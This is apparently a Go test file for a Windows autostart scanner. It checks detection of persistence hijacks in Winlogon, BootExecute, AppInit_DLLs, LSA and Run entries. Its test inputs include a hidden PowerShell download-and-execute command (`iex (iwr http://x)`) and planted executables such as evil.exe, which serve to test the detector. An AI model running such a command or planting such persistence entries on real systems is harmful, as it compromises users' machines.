package autoruns

import (
	"reflect"
	"testing"

	"lanterna/internal/scan"
)

func testReader(env *fakeEnv) reader {
	return reader{res: env.resolver(), cl: cleaner{profile: `C:\Users\anna`, user: "anna"}}
}

func TestRegistryHelpers(t *testing.T) {
	if runName("!*Aggiorna") != "Aggiorna" || runName("Normale") != "Normale" {
		t.Error("runName")
	}
	if c, dll := runOnceExFile(`C:\x\a.dll|Install|/q`); c != `C:\x\a.dll` || !dll {
		t.Errorf("RunOnceEx con DLL: %q %v", c, dll)
	}
	if c, dll := runOnceExFile(`C:\x\setup.exe /q`); c != `C:\x\setup.exe /q` || dll {
		t.Errorf("RunOnceEx con comando: %q %v", c, dll)
	}
	if got := splitList(`C:\Windows\system32\userinit.exe, C:\x\evil.exe,`); !reflect.DeepEqual(got, []string{`C:\Windows\system32\userinit.exe`, `C:\x\evil.exe`}) {
		t.Errorf("splitList: %q", got)
	}
	if got := splitAppInit(`C:\PROGRA~1\a.dll,b.dll  "c.dll"`); !reflect.DeepEqual(got, []string{`C:\PROGRA~1\a.dll`, "b.dll", "c.dll"}) {
		t.Errorf("splitAppInit: %q", got)
	}
	if !isDefaultBootExecute("autocheck  autochk   *") || !isDefaultBootExecute("AUTOCHECK autochk *") || isDefaultBootExecute(`autocheck autochk /p \??\C:`) {
		t.Error("BootExecute predefinito")
	}
	if bootExecuteFile("autocheck autochk *") != `%SystemRoot%\System32\autochk.exe` || bootExecuteFile("sdnclean64.exe /x") != `%SystemRoot%\System32\sdnclean64.exe` {
		t.Error("file di BootExecute")
	}
	if lsaFile("msv1_0") != `%SystemRoot%\System32\msv1_0.dll` || lsaFile(`C:\x\pf.dll`) != `C:\x\pf.dll` || lsaFile("kerberos.dll") != `%SystemRoot%\System32\kerberos.dll` {
		t.Error("lsaFile")
	}
}

func TestWinlogon(t *testing.T) {
	rd := testReader(newFakeEnv())
	for _, c := range []struct {
		value, data string
		hijacks     []bool
	}{
		{"Shell", "explorer.exe", []bool{false}},
		{"Shell", `C:\Windows\explorer.exe`, []bool{false}},
		{"Shell", `%SystemRoot%\explorer.exe`, []bool{false}},
		{"Shell", `explorer.exe, C:\Users\anna\AppData\Roaming\x.exe`, []bool{false, true}},
		{"Shell", `explorer.exe /x`, []bool{true}},
		{"Shell", `cmd.exe`, []bool{true}},
		{"Userinit", `C:\Windows\system32\userinit.exe,`, []bool{false}},
		{"Userinit", `C:\WINDOWS\System32\Userinit.exe`, []bool{false}},
		{"Userinit", `%SystemRoot%\system32\userinit.exe`, []bool{false}},
		{"Userinit", `C:\Windows\system32\userinit.exe,C:\ProgramData\sync.exe`, []bool{false, true}},
	} {
		items := rd.winlogonItems("machine", `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`, c.value, c.data)
		var got []bool
		for _, it := range items {
			got = append(got, it.hijack)
			if it.entry.Category != "winlogon" || it.file == "" {
				t.Errorf("%s=%q: voce %+v", c.value, c.data, it)
			}
		}
		if !reflect.DeepEqual(got, c.hijacks) {
			t.Errorf("%s=%q: dirottamenti %v, attesi %v", c.value, c.data, got, c.hijacks)
		}
	}
	items := rd.winlogonItems("machine", "", "Shell", `explorer.exe, C:\Users\anna\AppData\Roaming\x.exe`)
	if items[1].entry.Command != `%USERPROFILE%\AppData\Roaming\x.exe` || items[1].file != `C:\Users\anna\AppData\Roaming\x.exe` {
		t.Errorf("comando sanificato e file vero: %+v", items[1])
	}
}

func TestHijackItems(t *testing.T) {
	rd := testReader(newFakeEnv())
	be := rd.bootExecuteItems("HKLM\\x", []string{"autocheck autochk *", "", `autocheck autochk /p \??\C:`, "evil"})
	if len(be) != 3 || be[0].hijack || !be[1].hijack || !be[2].hijack || be[0].file != `C:\Windows\System32\autochk.exe` || be[2].file != `C:\Windows\System32\evil.exe` {
		t.Errorf("BootExecute: %+v", be)
	}
	ai := rd.appInitItems("machine32", "HKLM\\y", `C:\Windows\System32\a.dll b.dll`, true)
	if len(ai) != 2 || !ai[0].hijack || !ai[0].entry.Enabled || ai[0].file != `C:\Windows\SysWOW64\a.dll` || ai[1].file != `C:\Windows\SysWOW64\b.dll` {
		t.Errorf("AppInit attivo a 32 bit: %+v", ai)
	}
	if off := rd.appInitItems("machine", "", "a.dll", false); off[0].hijack || off[0].entry.Enabled {
		t.Errorf("AppInit spento: %+v", off)
	}
	lsa := rd.lsaItems("lsa-security", `HKLM\SYSTEM\CurrentControlSet\Control\Lsa`, []string{"kerberos", `""`, "", " msv1_0 "})
	if len(lsa) != 2 || lsa[0].file != `C:\Windows\System32\kerberos.dll` || lsa[1].entry.Name != "msv1_0" {
		t.Errorf("LSA: %+v", lsa)
	}
	env := newFakeEnv(`C:\Windows\System32\spool\prtprocs\x64\winprint.dll`)
	rd = testReader(env)
	dirs := []string{`C:\Windows\System32\spool\prtprocs\W32X86`, `C:\Windows\System32\spool\prtprocs\x64`}
	if got := rd.printProcFile("winprint.dll", dirs); got != `C:\Windows\System32\spool\prtprocs\x64\winprint.dll` {
		t.Errorf("processore di stampa: %q", got)
	}
	if got := rd.printProcFile("altro.dll", dirs); got != `C:\Windows\System32\spool\prtprocs\W32X86\altro.dll` {
		t.Errorf("processore mancante: %q", got)
	}
}

func TestCommandItem(t *testing.T) {
	rd := testReader(newFakeEnv(`C:\Users\anna\AppData\Roaming\Vendor\agent.dll`))
	e := scan.AutorunEntry{Category: "logon", Kind: "run", Name: "x", Enabled: true}
	it := rd.commandItem(e, `rundll32.exe "%APPDATA%\Vendor\agent.dll",Start`, false)
	if it.file != `C:\Windows\System32\rundll32.exe` || it.target != `C:\Users\anna\AppData\Roaming\Vendor\agent.dll` || it.interpreted {
		t.Errorf("rundll32: %+v", it)
	}
	if it.entry.Command != `rundll32.exe "%APPDATA%\Vendor\agent.dll",Start` {
		t.Errorf("comando: %q", it.entry.Command)
	}
	it = rd.commandItem(e, `powershell.exe -w hidden -c "iex (iwr http://x)"`, false)
	if !it.interpreted || it.target != "" {
		t.Errorf("comando interpretato: %+v", it)
	}
	it = rd.commandItem(e, `"C:\Users\anna\AppData\Local\App\app.exe" --tray`, false)
	if it.entry.Command != `"%USERPROFILE%\AppData\Local\App\app.exe" --tray` || it.target != "" || it.interpreted {
		t.Errorf("programma normale: %+v", it)
	}
}

func TestShortcutItem(t *testing.T) {
	rd := testReader(newFakeEnv())
	e := scan.AutorunEntry{Category: "logon", Kind: "folder", Name: "App", Enabled: true}
	lnk := buildLnk(t, lnkSpec{local: `C:\Program Files\App\app.exe`, args: "--startup"})
	it := rd.shortcutItem(e, `C:\Users\anna\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\App.lnk`, lnk)
	if it.file != `C:\Program Files\App\app.exe` || it.entry.Command != `"C:\Program Files\App\app.exe" --startup` {
		t.Errorf("collegamento: %+v", it)
	}
	// Collegamento rovinato: il file è il collegamento stesso.
	it = rd.shortcutItem(e, `C:\x\Rotto.lnk`, []byte("non è un collegamento"))
	if it.file != `C:\x\Rotto.lnk` {
		t.Errorf("collegamento rovinato: %+v", it)
	}
	it = rd.shortcutItem(e, `C:\x\script.vbs`, nil)
	if it.file != `C:\x\script.vbs` {
		t.Errorf("script nella cartella: %+v", it)
	}
}
